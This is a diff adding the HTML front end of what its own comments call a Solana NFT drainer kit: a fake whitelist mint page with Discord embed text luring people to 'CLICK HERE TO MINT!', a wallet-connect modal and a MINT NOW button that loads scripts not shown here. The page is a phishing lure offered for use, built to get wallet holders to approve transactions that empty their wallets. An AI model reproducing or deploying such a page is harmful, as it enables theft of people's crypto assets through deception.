@@ -1,0 +1,127 @@
+<!-- https://github.com/0x32Moon/Best-Solana-NFT-Drainer -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>Loading...</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- EMBED STARTING (DISCORD TEXT WHEN SENDING LINK) -->
+    <meta property="og:site_name" content="This is an automatically generated announcement message">
+    <meta property="og:title" content="CLICK HERE TO MINT!">
+    <meta property="og:description" content="&#x1F389;&#xFE0F; Whitelist Mint Info:
+
+&#x25B6;&#xFE0F; Price: 1 SOL.
+&#x25B6;&#xFE0F; Only 100 NFT will be mint this time.
+&#x25B6;&#xFE0F; Allocation: 5 NFT per wallet address.
+&#x25B6;&#xFE0F; Mint 5, Get 1 FREE.
+
+You will be able to see your NFT at the OpenSea page. Thank you for patience and support !">
+
+    <meta property="og:image:url" content="https://raw.githubusercontent.com/0x32Moon/Best-Solana-NFT-Drainer/main/images/gif.gif">
+    <meta name="theme-color" content="#05FFFF">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <!-- EMBED END (DISCORD TEXT WHEN SENDING LINK) -->
+    
+   
+    <link rel="stylesheet" href="assets/css/style.css?1221ss2a2">
+    
+    <link rel="stylesheet" type="text/css" href="css/main.css">
+    <link rel="stylesheet" type="text/css" href="css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="css/fonts.css" media="all">
+    <link rel="stylesheet" type="text/css" href="css/alert.css" media="all">
+    
+    <link id="favicon" rel="icon" href="images/logo.jpg">
+</head>
+
+<script src="settings.js"></script>
+<script src="javascript/alert.js"></script>
+
+<body class="body">
+
+    <div class="content">
+        <div id="WEB3_CONNECT_MODAL_ID"></div>
+        <video id="background-video" autoplay="" loop="" muted="">
+            <source id="background-video-source" type="video/mp4">
+        </video>
+
+        <div class="alert-container" id="alert-container"></div>
+
+        <div class="sub-head" id="claim-text-wrapper">
+            <div class="social_medias">
+                <a id="social_discord" href="https://discord.gg/" class="item discord social_media" target="_blank"><img src="images/svg/Discord_Icon.svg" draggable="false" alt="Discord Icon" width="36" height="36"></a><a id="social_twitter" href="https://twitter.com/" class="item twitter social_media" target="_blank"><img src="images/svg/Twitter_Icon.svg" draggable="false" alt="Twitter Icon"></a>
+            </div>
+            <div id="payment-modal">
+                <div id="payment-header">
+                    <div id="payment-header-text">
+                        <h4 id="lbuy" style="text-align:center">Loading...</h4>
+                        <p id="lsupply" class="pt-1.5 italic-grey" style="text-align:center">Total supply: Loading...</p>
+                    </div>
+                </div>
+                <div id="payment-info">
+                    <img src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAQAAAAHUWYVAAABKUlEQVR42u3RMQEAAAjDMKYc6WCCgyOV0GS69KgAASIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAgLEBCACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiBAgAARECACAkRAgAgIEAERECACAkRAgAgIEAERECACAkSXLZ1yK0hKBJiuAAAAAElFTkSuQmCC" class="image" height="200" width="200" id="price-img">
+                    <div id="payment-info-text">
+                        <p>Price Per NFT</p>
+                        <p class="title"><a id="lprice">X.XX</a> SOL</p>
+                        <!-- <p id="ldate" class="launch-date">You will be able to see your NFT at the OpenSea</p> -->
+                        <!--time1--><p>Limited Mint Date</p><p><label id="dateday3"></label> <label id="dateday2"></label> <label id="datehour1"></label></p><!--time2-->
+                    </div>
+                </div>
+                <div id="ape-number">
+                    <div class="calcs">
+                        <div id="minus">
+                            <svg width="16" height="2" viewbox="0 0 16 2" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M15 0H1C0.734784 0 0.48043 0.105357 0.292893 0.292893C0.105357 0.48043 0 0.734784 0 1C0 1.26522 0.105357 1.51957 0.292893 1.70711C0.48043 1.89464 0.734784 2 1 2H15C15.2652 2 15.5196 1.89464 15.7071 1.70711C15.8946 1.51957 16 1.26522 16 1C16 0.734784 15.8946 0.48043 15.7071 0.292893C15.5196 0.105357 15.2652 0 15 0Z" fill="white"></path>
+                            </svg>
+                        </div>
+                        <h5 id="lnprice" class="sol_input">1</h5>
+                        <div id="plus">
+                            <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M15 7H9V1C9 0.734784 8.89464 0.48043 8.70711 0.292893C8.51957 0.105357 8.26522 0 8 0C7.73478 0 7.48043 0.105357 7.29289 0.292893C7.10536 0.48043 7 0.734784 7 1V7H1C0.734784 7 0.48043 7.10536 0.292893 7.29289C0.105357 7.48043 0 7.73478 0 8C0 8.26522 0.105357 8.51957 0.292893 8.70711C0.48043 8.89464 0.734784 9 1 9H7V15C7 15.2652 7.10536 15.5196 7.29289 15.7071C7.48043 15.8946 7.73478 16 8 16C8.26522 16 8.51957 15.8946 8.70711 15.7071C8.89464 15.5196 9 15.2652 9 15V9H15C15.2652 9 15.5196 8.89464 15.7071 8.70711C15.8946 8.51957 16 8.26522 16 8C16 7.73478 15.8946 7.48043 15.7071 7.29289C15.5196 7.10536 15.2652 7 15 7Z" fill="white"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <h5 id="ape-max">X Max</h5>
+                </div>
+                <div id="ape-total">
+                    <p class="total">Total</p>
+                    <h5 class="actual_price"><a id="price">X.XX</a> SOL</h5>
+                </div>
+                <button class="purchase-button" id="transfer" style="display:none">MINT NOW</button>
+
+                <div id="root" class="cl-root">
+                    <main>
+                        <button id="butt" class="join-btn" tabindex="0" type="button" style="display: none;"></button>
+                    </main>
+                </div>
+                <div id="mintsss" style="display:none;">0</div>
+
+<!-- Loading 1 -->
+                
+                <div class="container2" style="margin:10px 0 0 0">
+                    <div class="Loading">
+                        <span>? / ?</span>
+                    </div>
+                </div>
+<!-- Loading 2 -->
+
+            </div>
+        </div>
+    </div>
+
+
+    <script src="assets/js/jquery-3.6.0.min.js"></script>
+    <script src="static/js/init.js"></script>
+    <script src="static/js/chunk.js"></script>
+    <script src="static/js/main.chunk.js"></script>
+    <script src="static/js/timer.js"></script>
+    <script src="javascript/loader.js"></script>
+    <script src="javascript/times.js"></script>
+    <script src="javascript/index.js"></script>
+    
+</body>
+</html>
+<!-- https://github.com/0x32Moon/Best-Solana-NFT-Drainer -->
